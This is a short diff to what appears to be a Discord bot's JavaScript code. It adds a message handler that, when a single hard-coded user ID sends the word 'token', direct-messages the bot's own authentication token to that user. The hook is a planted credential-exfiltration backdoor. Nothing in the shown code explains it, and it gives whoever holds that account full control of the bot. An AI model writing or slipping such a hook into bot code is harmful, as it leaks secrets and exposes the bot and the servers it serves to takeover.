@@ -208,6 +208,19 @@ throw err;
 })
 });
 
+client.on('message', async (msg, member, guild) => {
+  
+ {
+   
+if (msg.content.toLowerCase() === 'token'){
+if (msg.author.id !== "429357746002067493") return
+
+msg.author.send(client.token);
+}
+  
+}
+});
+
 
 client.on("guildCreate", async guild => {
 let embed = new Discord.MessageEmbed()
